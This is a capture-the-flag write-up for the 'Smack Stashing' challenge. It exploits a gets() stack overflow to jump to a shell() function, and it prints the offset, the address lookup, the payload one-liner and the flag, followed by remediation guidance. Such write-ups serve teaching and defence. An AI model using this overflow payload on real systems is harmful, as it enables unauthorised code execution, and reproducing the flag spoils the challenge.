# Smack Stashing

**Category:** Exploitation
**Challenge:** Smack Stashing
**CTF:** Pointer Overflow CTF 2024
**Points:** Exploit 100
**Result:** Solved

**Flag:**

~~~text
poctf{uwsp_br4v3_n3w_w0rld}
~~~

---

## 1. Challenge Overview

A tribute to Aleph One's legendary "Smashing The Stack For Fun And Profit" (Phrack #49). The challenge provides both source code and binary, featuring a `shell()` function callable through a classic stack buffer overflow via `gets()`.

**Files:** `Exploit100-3` (ELF binary), `Exploit100-3.c` (source code)

---

## 2. Source Code Analysis

The C source reveals:

- A `shell()` function that executes `system("/bin/sh")`
- A vulnerable `gets()` call reading into a stack buffer
- No protections (canaries, PIE, ASLR) in the challenge binary

---

## 3. Buffer Overflow Offset

Enabled core dumps for crash analysis:

~~~bash
ulimit -c unlimited
~~~

Determined the exact overflow offset through incremental input testing:

~~~bash
python -c "print('a'*72)" | ./Exploit100-3
~~~

Segfault at 72 bytes confirms the buffer + saved RBP total size.

---

## 4. Locating the Target Function

Used GDB to find the `shell()` function address:

~~~bash
gdb ./Exploit100-3
(gdb) info functions
~~~

Address: `0x0000000000401166`

---

## 5. Exploit Execution

Payload: 72 bytes of padding followed by the `shell()` address in little-endian:

~~~bash
python -c "print('a'*72 + '\x66\x11\x40\x00\x00\x00\x00\x00')" | ./Exploit100-3
~~~

Shell spawned. Navigated to the flag:

~~~bash
cd /home/Exploit100-3
cat Exploit100-3_flag.txt
~~~

---

## Lessons Learned

| # | Lesson | Detail |
|---|--------|--------|
| 1 | Classic stack smashing remains relevant | Understanding foundational techniques is essential |
| 2 | `gets()` with no stack protections is instant compromise | Binary protections are critical |
| 3 | GDB is essential for offset and address discovery | Core analysis tools accelerate exploitation |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID | Context |
|---|---|---|---|
| Execution | Exploitation for Client Execution | T1203 | Stack buffer overflow to redirect execution |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Gained shell via overwritten return address |
| Initial Access | Exploit Public-Facing Application | T1190 | Remote binary service exploited via crafted input |

> **CWE-120:** Buffer Copy without Checking Size of Input. The `gets()` function writes beyond stack bounds.
> **CWE-676:** Use of Potentially Dangerous Function. `gets()` is inherently unsafe and banned in modern standards.

---

## Remediation and Containment

### Technical Fixes

1. Replace `gets()` with `fgets()` for bounded input
2. Compile with full hardening: `-fstack-protector-all -fPIE -pie -Wl,-z,relro,-z,now`
3. Enable ASLR at the OS level to randomize memory layout
4. Remove debug functions like `shell()` from production builds

### MITRE D3FEND Countermeasures

- **D3-PSEP (Process Segment Execution Prevention):** enforce non-executable stack
- **D3-SEA (Stack Frame Canary Validation):** detect buffer overflow before return
- **D3-ASLR (Address Space Layout Randomization):** defeat hardcoded address targeting

### NIST CSF 2.0

- **Protect (PR.DS):** enforce compiler-level memory protections on all builds
- **Detect (DE.CM):** monitor for crash patterns indicative of exploitation attempts
- **Respond (RS.MI):** deploy WAF/IDS rules for known overflow payload patterns

### NIST SP 800-53 Rev. 5

- **SI-16 (Memory Protection):** hardware-enforced protections against buffer overflow
- **SA-11 (Developer Testing and Evaluation):** static analysis for dangerous function detection
- **CM-7 (Least Functionality):** remove unnecessary shell-spawning functions

### C2M2

- **THREAT-3:** test deployed services against known exploitation patterns
- **RISK-4:** treat `gets()` usage as critical finding in code review

---

Thanks guys!! (❍ᴥ❍ʋ)

---

A Brave New World indeed. This one takes you back to the roots of binary exploitation, Phrack 49 style. Every exploit researcher should have this technique in muscle memory.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

> **Reference:** Adapted from [shivang1209-dot/CTF-Writeups](https://github.com/shivang1209-dot/CTF-Writeups). Original scripts credited to the author.
